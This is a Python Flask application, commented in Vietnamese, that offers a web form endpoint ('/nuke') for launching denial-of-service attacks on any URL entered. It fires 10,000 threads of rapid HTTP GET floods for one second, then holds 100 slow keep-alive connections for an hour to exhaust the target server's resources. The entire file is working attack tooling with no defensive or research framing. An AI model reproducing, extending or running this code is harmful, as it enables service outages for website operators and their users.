import os
import threading
import requests
import time
from flask import Flask, request, render_template, jsonify

app = Flask(__name__)

attack_running = False
keep_alive_threads = []

def heavy_flood(url, duration=1):
    """Bắn request cực nhanh trong 1 giây"""
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    })
    start = time.time()
    while time.time() - start < duration:
        try:
            session.get(url, timeout=0.01, stream=True)
        except:
            pass

def slow_keep_alive(url, duration=3600):
    """Giữ kết nối lâu dài bằng cách gửi request thưa dần, làm tốn tài nguyên server"""
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Connection': 'keep-alive'
    })
    start = time.time()
    while time.time() - start < duration:
        try:
            session.get(url, timeout=5, stream=True)
        except:
            pass
        time.sleep(2)  # Gửi mỗi 2 giây để giữ kết nối

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/nuke', methods=['POST'])
def nuke():
    global attack_running
    if attack_running:
        return jsonify({"status": "error", "message": "Đang có tấn công khác"})

    url = request.form.get('url')
    name = request.form.get('name', 'web')
    if not url:
        return jsonify({"status": "error", "message": "Vui lòng nhập URL"})

    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    attack_running = True

    # Giai đoạn 1: Bắn flood cực mạnh trong 1 giây (10000 luồng)
    threads = []
    for _ in range(10000):
        t = threading.Thread(target=heavy_flood, args=(url, 1))
        t.daemon = True
        t.start()
        threads.append(t)

    # Đợi flood hoàn thành (1 giây + chút thời gian khởi tạo)
    time.sleep(1.5)

    # Giai đoạn 2: Duy trì kết nối chậm (100 luồng, kéo dài 1 giờ)
    slow_threads = []
    for _ in range(100):
        t = threading.Thread(target=slow_keep_alive, args=(url, 3600))
        t.daemon = True
        t.start()
        slow_threads.append(t)

    # Đánh dấu đã hoàn thành flood, nhưng vẫn giữ slow threads
    attack_running = False

    return jsonify({
        "status": "success",
        "message": f"💥 Đã tấn công {name} ({url}) trong 1 giây, hiệu ứng kéo dài ~1 giờ (duy trì kết nối chậm)."
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)
